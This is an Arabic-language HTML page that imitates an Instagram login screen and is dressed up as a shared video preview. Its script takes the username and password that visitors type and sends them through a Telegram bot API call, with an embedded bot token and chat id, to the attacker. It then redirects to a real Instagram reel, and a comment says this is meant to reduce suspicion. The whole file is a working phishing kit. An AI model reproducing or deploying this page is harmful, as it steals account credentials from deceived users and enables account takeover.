<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <meta property="og:title" content="Abdulaziz Shah على Instagram : ما توقعت المايك يلقط تغريد الطيور...">
    <meta property="og:description" content="شاهد الفيديو الكامل الآن عبر تطبيق Instagram.">
    <meta property="og:image" content="https://scontent.cdninstagram.com/v/t51.2885-15/434524458_1123447385517373_7562846834162356541_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=18de2a&_nc_ohc=example"> 
    <meta property="og:type" content="video.other">
    
    <title>Instagram</title>
    
    <style>
        /* تصميم ملء الشاشة بدون مربعات عائمة */
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        .wrapper { display: flex; flex-direction: column; align-items: center; width: 100%; padding-top: 40px; }
        .insta-logo { width: 175px; margin-bottom: 35px; }
        .form-container { width: 85%; max-width: 350px; }
        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 12px; margin-bottom: 8px; box-sizing: border-box; font-size: 14px; }
        .btn-login { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 5px; padding: 12px; font-weight: 600; font-size: 14px; margin-top: 10px; cursor: pointer; }
        .separator { display: flex; align-items: center; text-align: center; color: #8e8e8e; font-size: 13px; margin: 25px 0; width: 100%; }
        .separator::before, .separator::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
        .separator::before { margin-left: 1.5em; }
        .separator::after { margin-right: 1.5em; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; margin-bottom: 20px; }
        .footer { position: absolute; bottom: 20px; width: 100%; text-align: center; font-size: 12px; color: #8e8e8e; }
    </style>
</head>
<body>

    <div class="wrapper">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" class="insta-logo">
        
        <div class="form-container">
            <input type="text" id="u" placeholder="اسم المستخدم أو الهاتف">
            <input type="password" id="p" placeholder="كلمة السر">
            <button class="btn-login" onclick="send()">تسجيل الدخول</button>
            
            <div class="separator">أو</div>
            <a href="#" class="fb-login">تسجيل الدخول بحساب فيسبوك</a>
        </div>
    </div>

    <div class="footer">من META</div>

    <script>
        function send() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(u && p) {
                // بوت التليجرام الخاص بك
                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=👤User: ${u}%0A🔑Pass: ${p}`);
                // تحويل مباشر للفيديو الأصلي لتقليل الشك
                setTimeout(() => { window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/"; }, 1000);
            }
        }
    </script>
</body>
</html>
